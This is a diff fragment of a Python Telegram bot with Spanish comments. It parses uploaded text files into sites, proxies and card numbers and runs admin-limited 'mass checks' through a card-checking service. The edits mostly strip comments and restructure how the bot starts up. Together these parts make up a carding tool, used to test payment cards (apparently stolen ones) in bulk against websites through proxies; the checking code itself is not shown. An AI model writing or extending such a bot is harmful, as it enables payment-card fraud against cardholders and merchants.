 async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Procesa archivos .txt con detección inteligente (proxies primero)"""
+    """Procesa archivos .txt con detección inteligente"""
     user_id = update.effective_user.id
     document = update.message.document
     
@@ -2283,12 +2205,10 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if line_type == 'site':
             sites_added.append(normalized)
         elif line_type == 'proxy':
-            # Normalizar proxy simple a formato API
             if normalized.count(':') == 1:
                 normalized = f"{normalized}::"
             proxies_added.append(normalized)
         elif line_type == 'card':
-            # Validar tarjeta completa
             card_data = CardValidator.parse_card(normalized)
             if card_data:
                 cards_added.append(normalized)
@@ -2297,7 +2217,6 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             unknown.append(line)
     
-    # Guardar en base de datos
     user_data = await user_manager.get_user_data(user_id)
     updated = False
     
@@ -2319,7 +2238,6 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             cards=user_data["cards"]
         )
     
-    # Mensaje de respuesta
     msg_parts = []
     if sites_added:
         msg_parts.append(f"✅ {len(sites_added)} sitio(s) añadido(s)")
@@ -2342,7 +2260,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Comando de inicio - SIEMPRE muestra el menú principal"""
     user_id = update.effective_user.id
     
-    # Limpiar cualquier estado residual
     if user_id in active_mass:
         active_mass.discard(user_id)
     
@@ -2357,26 +2274,22 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("No active mass check.")
 
-# ================== COMANDO SETWORKERS (SIN GLOBAL) ==================
+# ================== COMANDO SETWORKERS ==================
 async def setworkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cambiar límite de workers (solo admin) - SIN GLOBAL"""
+    """Cambiar límite de workers (solo admin)"""
     user_id = update.effective_user.id
     
-    # Verificar si es admin
     if user_id not in Settings.ADMIN_IDS:
         await update.message.reply_text("❌ Not authorized.")
         return
     
-    # Si no hay argumentos, mostrar valor actual
     if not context.args:
         await update.message.reply_text(f"Current max workers: {Settings.MAX_WORKERS_PER_USER}")
         return
     
-    # Intentar cambiar el valor
     try:
         new_value = int(context.args[0])
         if 1 <= new_value <= 20:
-            # Modificar directamente la clase Settings (sin global)
             Settings.MAX_WORKERS_PER_USER = new_value
             await update.message.reply_text(f"✅ Max workers set to {new_value}")
         else:
@@ -2387,44 +2300,36 @@ async def setworkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 # ================== MAIN ==================
 async def shutdown(application: Application):
     logger.info("🛑 Cerrando...")
-    if checker:
-        await checker.shutdown()
     if db:
         await db.shutdown()
     logger.info("✅ Cerrado")
 
 async def post_init(application: Application):
-    global db, user_manager, checker, card_service
+    global db, user_manager, card_service
     
     db = Database()
     await db.initialize()
     await db.cleanup_old_results()
     
     user_manager = UserManager(db)
-    checker = UltraFastChecker()
-    await checker.initialize()
+    card_service = CardCheckService(db, user_manager)
     
-    card_service = CardCheckService(db, user_manager, checker)
-    
-    logger.info("✅ Bot inicializado con correcciones de timeout y caché")
+    logger.info("✅ Bot inicializado con sistema de jobs aislados")
 
 def main():
     app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
     app.post_shutdown = shutdown
 
-    # Comandos
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("setworkers", setworkers_command))
     
-    # Manejador de botones
     app.add_handler(CallbackQueryHandler(button_handler))
     
-    # Manejadores de mensajes y documentos
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
 
-    logger.info("🚀 Bot iniciado con todas las correcciones")
+    logger.info("🚀 Bot iniciado con jobs aislados (pestañas)")
     app.run_polling()
 
 if __name__ == "__main__":
